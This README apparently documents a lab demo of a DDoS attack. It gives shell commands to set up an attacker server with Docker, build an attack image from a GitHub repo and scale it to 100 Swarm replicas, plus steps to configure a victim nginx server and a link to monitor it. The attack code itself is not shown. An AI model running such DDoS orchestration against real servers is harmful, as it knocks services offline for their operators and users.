# DDOS Docker Swarm attack

## Config attacker server
```
    ./connect-to-attacker
    sudo apt update
    sudo apt install -y apt-transport-https ca-certificates curl software-properties-common
    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
    sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable"
    sudo apt update
    sudo apt install -y docker-ce
```

## Run attack
```
    git clone https://github.com/sjdonado/ddos-attack-docker-swarm-demo.git
    cd ddos-attack-docker-swarm-demo
    sudo docker build -t ddos-attack .
    sudo docker swarm init
    sudo docker service create --name ddos_attack_service --detach=false ddos-attack
    sudo docker service scale ddos_attack_service=100
    sudo docker service logs ddos-attack
```

## Config victim nginx server
```
    ./connect-to-victim
    sudo apt-get install nginx
    git clone https://github.com/sjdonado/ddos-attack-docker-swarm-demo.git
    cd ddos-attack-docker-swarm-demo
    sudo mv nginx/default.conf /etc/nginx/sites-enabled/default
    cd api
    sudo docker build -t ddos-attack-api .
    sudo docker run -p 3000:3000 -d ddos-attack-api
    sudo service nginx restart
```

## Monitoring victim nginx server
Go to http://18.190.15.1/nginx_status
